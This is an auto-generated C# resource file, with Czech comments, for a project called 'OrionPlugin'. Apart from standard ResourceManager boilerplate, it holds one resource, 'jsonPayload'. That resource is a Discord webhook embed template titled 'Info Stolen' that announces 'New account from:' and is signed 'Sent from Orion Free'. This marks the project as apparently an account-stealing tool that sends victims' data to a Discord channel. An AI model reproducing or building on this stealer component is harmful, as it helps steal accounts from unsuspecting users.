﻿//------------------------------------------------------------------------------
// <auto-generated>
//     Tento kód byl generován nástrojem.
//     Verze modulu runtime:4.0.30319.42000
//
//     Změny tohoto souboru mohou způsobit nesprávné chování a budou ztraceny,
//     dojde-li k novému generování kódu.
// </auto-generated>
//------------------------------------------------------------------------------

namespace OrionPlugin {
    using System;
    
    
    /// <summary>
    ///   Třída prostředků se silnými typy pro vyhledávání lokalizovaných řetězců atp.
    /// </summary>
    // Tato třída byla automaticky generována třídou StronglyTypedResourceBuilder
    // pomocí nástroje podobného aplikaci ResGen nebo Visual Studio.
    // Chcete-li přidat nebo odebrat člena, upravte souboru .ResX a pak znovu spusťte aplikaci ResGen
    // s parametrem /str nebo znovu sestavte projekt aplikace Visual Studio.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "17.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resource1 {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resource1() {
        }
        
        /// <summary>
        ///   Vrací instanci ResourceManager uloženou v mezipaměti použitou touto třídou.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("OrionPlugin.Resource1", typeof(Resource1).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Potlačí vlastnost CurrentUICulture aktuálního vlákna pro všechna
        ///   vyhledání prostředků pomocí třídy prostředků se silnými typy.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Vyhledá lokalizovaný řetězec podobný {
        ///  &quot;&quot;embeds&quot;&quot;: [{
        ///
        ///    &quot;&quot;author&quot;&quot;: {
        ///        &quot;&quot;name&quot;&quot;: &quot;&quot;Info Stolen&quot;&quot;,
        ///        &quot;&quot;icon_url&quot;&quot;: &quot;&quot;https://cdn.discordapp.com/attachments/915148799100452928/915165279472996403/27339047_170x100.gif&quot;&quot;
        ///    },
        ///
        ///    &quot;&quot;footer&quot;&quot;: {
        ///        &quot;&quot;icon_url&quot;&quot;: &quot;&quot;https://cdn.discordapp.com/attachments/871760442534551622/915146681887125515/planet.png&quot;&quot;,
        ///        &quot;&quot;text&quot;&quot;: &quot;&quot;Sent from Orion Free&quot;&quot;
        ///    },
        ///
        ///    &quot;&quot;fields&quot;&quot;: [
        ///        {
        ///            &quot;&quot;name&quot;&quot;: &quot;&quot;New account from: &quot;&quot;,
        ///
        ///            &quot;&quot;value&quot;&quot;: &quot;&quot;test&quot;&quot; [zbytek řetězce byl zkrácen];.
        /// </summary>
        internal static string jsonPayload {
            get {
                return ResourceManager.GetString("jsonPayload", resourceCulture);
            }
        }
    }
}